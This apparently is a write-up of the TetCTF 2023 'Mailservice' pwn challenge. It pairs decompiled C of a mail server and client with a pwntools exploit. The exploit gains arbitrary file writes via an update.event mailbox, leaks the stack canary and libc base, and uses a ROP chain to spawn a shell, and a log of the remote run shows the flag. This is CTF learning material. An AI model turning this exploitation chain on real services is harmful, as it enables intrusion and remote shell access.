# TetCTF 2023: Mailservice

> 原文: https://www.ctfiot.com/90423.html
> ID: 90423


```
if ((open_files() == 0 && dolisten() == 0))
 {
 struct pollfd pollfds[0x2];
 memset(&pollfds, 0, 0x10);
 if (open_files() == 0)
 {
 pollfds[0].fd = eventfd;
 pollfds[0].events = 1;
 pollfds[1].fd = sockfd;
 pollfds[1].events = 1;
 while (true)
 {
 if (poll(&pollfds, 2, 0x1f4) > 0)
 {
 if ((((int32_t)pollfds[0].revents) & 1) != 0)
 {
 handle_events();
 }
 if ((((int32_t)pollfds[1].revents) & 1) != 0)
 {
 int32_t var_54 = 0x10;
 int64_t var_48 = 2;
 int64_t var_40_1 = 0;
 void var_38;
 int32_t fd = accept(sockfd, &var_38, &var_54);
 if (fd > 0)
 {
 if (setsockopt(((uint64_t)fd), 1, 0x14, &var_48, 0x10) >= 0)
 {
 handle_sock(fd);
 close(fd);
 }
 else
 {
 close(fd);
 }
 }
 }
 }
 }
 }
 }
```



```
if (read(eventfd, &cmd, 3) == 3)
 {
 int32_t rax_3 = cmd;
 int32_t len;
 void data;
 if (rax_3 == 'ATF')
 {
 if (read(eventfd, &data, 3) == 3)
 {
 __isoc99_sscanf(&data, &data_2799, &len);
 memset(&data, 0, 0x400);
 if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
 {
 FILE* filp = fopen(bin_path, &data_27a0);
 if (filp != 0)
 {
 fseek(filp, 0, 2);
 int32_t size = ftell(filp);
 fseek(filp, 0, 0);
 int64_t ptr = calloc(((int64_t)((size + len) + 1)), 1);
 if (ptr != 0)
 {
 memcpy(ptr, &data, ((int64_t)len));
 fread((((int64_t)len) + ptr), 1, ((int64_t)size), filp);
 fseek(filp, 0, 0);
 fwrite(ptr, 1, ((int64_t)(size + len)), filp);
 fclose(filp);
 free(ptr);
 }
 else
 {
 fclose(filp);
 }
 }
 }
 }
 }
 else if (rax_3 > 'ATF')
 {
 if (rax_3 == 'SET')
 {
 memset(&data, 0, 0x400);
 if (read(eventfd, &data, 3) == 3)
 {
 __isoc99_sscanf(&data, &data_2799, &len);
 memset(&data, 0, 0x400);
 if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
 {
 if (bin_path != 0)
 {
 free(bin_path);
 }
 bin_path = strdup(&data);
 }
 }
 }
 else if ((rax_3 == 'NEW' && read(eventfd, &data, 3) == 3))
 {
 __isoc99_sscanf(&data, &data_2799, &len);
 memset(&data, 0, 0x400);
 if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
 {
 FILE* rax_24 = fopen(bin_path, &data_279c);
 if (rax_24 != 0)
 {
 fwrite(&data, 1, ((int64_t)len), rax_24);
 fclose(rax_24);
 }
 }
 }
 }
 else if (rax_3 == 'UPD')
 {
 system("echo 1 > /tmp/need_update");
 }
 else if ((rax_3 == 'ATE' && read(eventfd, &data, 3) == 3))
 {
 __isoc99_sscanf(&data, &data_2799, &len);
 memset(&data, 0, 0x400);
 if (read(eventfd, &data, ((int64_t)len)) == ((int64_t)len))
 {
 FILE* rax_63 = fopen(bin_path, &data_27a0);
 if (rax_63 != 0)
 {
 fseek(rax_63, 0, 2);
 fwrite(&data, 1, ((int64_t)len), rax_63);
 fclose(rax_63);
 }
 }
 }
 }
```



```
struct packet {
	uint32_t signal;
	uint32_t len;
	char buf[0x400];
}
```



```
Register - /home/mailserver/data/users/USERNAME is created. /home/mailserver/data/users/USERNAME/passwd has the password(no hash) written to it.

Login - The password is checked. If it is correct, the server sends back an access key NFA9BuWqoExEX5Ll. The access key gives the client unrestricted access to do any operation as any user, however since we can only interface with the mailserver through the limited mailclient, this is not exploitable.

Read mail - /home/mailserver/USERNAME is read and sent back to the client.

Send mail - the variables mailto, subject and content_path are read. At /home/mailserver/MAILTO, the data "SUBJECT|CONTENT_PATH" is written.
```



```
printf("Send to: ");
 void var_518;
 __isoc99_scanf("%256[a-zA-Z0-9.@]%*c", &var_518);
 __isoc99_sscanf(&var_518, "%[a-zA-Z0-9.]@%[a-zA-Z0-9.]", &var_418, &var_318);
 if (strcmp(&var_318, "hackemall.live") != 0)
 {
 puts("Only support domain hackemall.li…");
 }
 else
 {
 printf("Subject: ");
 void var_218;
 __isoc99_scanf("%256[a-zA-Z0-9.@#$^&*() \/<>?]%*…", &var_218);
 char* rax_8 = make_tempfile();
 if (rax_8 == 0)
 {
 puts("Create tempfile error!");
 }
 else
 {
 void tempfile_path;
 snprintf(&tempfile_path, 0x100, "/tmp/mail/content/%s", rax_8);
 free(rax_8);
 printf("Content's size: ");
 int32_t content_size;
 __isoc99_scanf("%d%*c", &content_size);
 if (content_size > 0x800)
 {
 content_size = 0x800;
 }
 void var_520;
 snprintf(&var_520, 8, "%04d", ((uint64_t)content_size));
 int64_t rax_18 = calloc(((int64_t)(content_size + 1)), 1);
 int32_t content_fd = open(&tempfile_path, 0x41, 0x1ff);
 if (content_fd < 0)
 {
 puts("Cann't create content file!");
 }
 else
 {
 write(content_fd, &var_520, 4);
 printf("Content: ");
 read(0, rax_18, ((uint64_t)content_size));
 write(content_fd, rax_18, ((uint64_t)content_size));
 close(content_fd);
 chmod(&tempfile_path, 0x1ff);
 free(rax_18);
```



```
char* rax_26 = strrchr(&var_c28.data, 0x7c);
 if (rax_26 == 0)
 {
 puts("Mail syntax error!");
 close(rax_3);
 }
 else
 {
 *(int8_t*)rax_26 = 0;
 printf("Subject: %s\n", &var_c28.data);
 int32_t rax_33 = open(&rax_26[1], 0);
 if (rax_33 < 0)
 {
 puts("Content not found!");
 close(rax_3);
 }
 else
 {
 void var_820;
 memset(&var_820, 0, 8);
 if (read(rax_33, &var_820, 4) == 4)
 {
 int32_t rax_44 = atoi(&var_820);
 void var_818;
 memset(&var_818, 0, 0x800);
 read(rax_33, &var_818, ((uint64_t)rax_44));
 write(1, &var_818, ((uint64_t)rax_44));
 close(rax_33);
 goto label_2211;
 }
 puts("Content not found!");
 close(rax_33);
 close(rax_3);
```



```
from pwn import *
e = ELF("./mailclient")
libc = ELF("./lib/libc.so.6")

context.binary = e

def login(email, password):
 p.sendlineafter("> ", "1")
 p.sendlineafter(": ", email)
 p.sendlineafter(": ", password)

def send(username, subject, content, content_size=None):
 if content_size is None:
 content_size = len(content)
 p.sendlineafter("> ", "3")
 p.sendlineafter(": ", f"{username}@hackemall.live")
 p.sendlineafter(": ", subject)
 p.sendlineafter(": ", str(content_size))
 p.sendafter(": ", content)

def read():
 p.sendlineafter("> ", "4")
 p.recvuntil(": ")
 subject = p.recvline()[:-1]
 data = p.recvuntil("*")[:-1]
 return subject, data
 
p = remote("139.162.36.205" if args.REMOTE else "localhost", 1337)

# We just need to interact with the mailclient's update.event file and that gives us arbitrary file write.
# From there, we can forge custom emails and achieve buffer overflows.

# Sending an email to update.event@hackemall.live will do it.

email = "day@hackemall.live"
password = "t"

username = email.split("@")[0]

login(email, password)
```



```
def build_packet(cmd, data,length=None):
 if length is None:
 length = len(data)
 # Builds an update.event packet(for ones that aren't UPD)
 return cmd + str(length).zfill(3).encode() + data
```



```
def build_packet(cmd, data,length=None):
 if length is None:
 length = len(data)
 # Builds an update.event packet(for ones that aren't UPD)
 return cmd + str(length).zfill(3).encode() + data

def send_event(data, content=None):
 if content is None:
 content = "I swear on my life, I always try, but in my eye, I can fly. Better luck next time.\n"
 send("update.event", data, content)
```



```
root@29b3c6292ea3:/home/mailserver/data# cat update.bin
PWNED
```



```
┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
└─$ pwn checksec mailclient 
[*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
```



```
read(fd, buf, SIZE);
write(1,buf,SIZE);
```



```
def custom_mail(username, data, size=None):
 if size is None:
 size = len(data)
 if type(data) == str:
 data = data.encode()
 # Build a custom email
 send_event(build_packet(b"SET", b"/tmp/evil"))
 send_event(build_packet(b"NEW", str(size).zfill(4).encode() + data))
 send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
 send_event(build_packet(b"NEW", b"pwned",len("pwned") + 1)) # smuggle the pipe in since it will be after the subject and we cant put it in the subject manually
 send_event(build_packet(b"ATE", b"/tmp/evil"))
```



```
custom_mail(username, b"", size=0x10000) # Very high size despite not putting much in the file. This makes it over print, so we can get leaks before exploiting the BOF.

_, leaks = read()
if leaks == b'':
 log.failure("Leaks failed.")
 quit()
log.success("Leaks suceeded")

old_buf = leaks
leaks = leaks[0x808:]

canary = u64(leaks[:8])
log.info(f"Canary: {hex(canary)}")
"""
for i in range(8, len(leaks), 8):
 num = u64(leaks[i:i+8].ljust(8, b"\x00"))
 if num == 0:
 continue
 print(hex(num), i)
"""

e.address = u64(leaks[16:16+8]) - 0x2335
libc.address = u64(leaks[64:64+8]) - 0x29d90
log.info(f"Binary base: {hex(e.address)}")
log.info(f"Libc base: {hex(libc.address)}")
```



```
rop = ROP(libc)
rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

payload = flat(canary, e.address + 0x4000, rop.chain())

# Ok, now we need to construct the payload in a file. Not easy.
# We set the update file to /home/mailserver/data/day and then use NEW and some tomfoolery to dump the file path of some content file that contains the main par tof the payload into my mail
# Then, we can cleanly leak the file path(we dump it as the subject) and use existing primitives to build up the file until its suitable
# And use our regular old primitives to get it to read in the payload

send_event(build_packet(b"SET", f"/home/mailserver/data/{username}".encode()))
send_event(b"NEW" + b"34", payload) # Basically the data written will be NEW34|/tmp/mail/content/FILENAME . 34| will be sscanf'd to get the length as 34 and then the data will be read in as the rest
send_event(b"ATE" + b"001")
```



```
filname, _ = read()
log.success(f"Leaked filename: {filname.decode()}")
```



```
# Now ATF is actually useful. We have 4 bytes + payload. We want evil size + 0x804 filler bytes + 4 bytes + payload
# Unfortunately we cannot write that many bytes in the subject at a time. No worry, it's only a few iterations.

send_event(build_packet(b"SET", filname))
to_add = str(0x808 + len(payload)).zfill(4).encode() + b"A"*0x804

chunks = []
for i in range(0, len(to_add), 200):
 chunks.append(to_add[i:i+200])

for chunk in chunks[::-1]:
 send_event(build_packet(b"ATF", chunk))

mail_file(username, filname)
```



```
p.sendlineafter("> ", "4")
p.clean(0.2)
p.sendline("cd /home/mailclient")
p.sendline("cat flag*")
```



```
┌──(kali㉿kali)-[~/CTFs/tet/mail/user_build]
└─$ python3.10 exploit.py REMOTE
[*] '/home/kali/CTFs/tet/mail/user_build/mailclient'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[*] '/home/kali/CTFs/tet/mail/user_build/lib/libc.so.6'
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[+] Opening connection to 139.162.36.205 on port 1337: Done
[+] Leaks suceeded
[*] Canary: 0x1d5f307b787f8c00
[*] Binary base: 0x5590c0c00000
[*] Libc base: 0x7feaecc9a000
[*] Loaded 218 cached gadgets for './lib/libc.so.6'
[+] Leaked filename: /tmp/mail/content/6bMH5uabHh1GNIoc
[*] Switching to interactive mode
TetCTF{2b15f22179fc01196b2e673764e45a7f}
$ ls
flag_e6db1baa29d3df1eb307ff6a12c778da
mailclient
$ id
uid=1000(mailclient) gid=1000(mailclient) groups=1000(mailclient)
$ whoami
mailclient
$ 
[*] Interrupted
[*] Closed connection to 139.162.36.205 port 1337
```
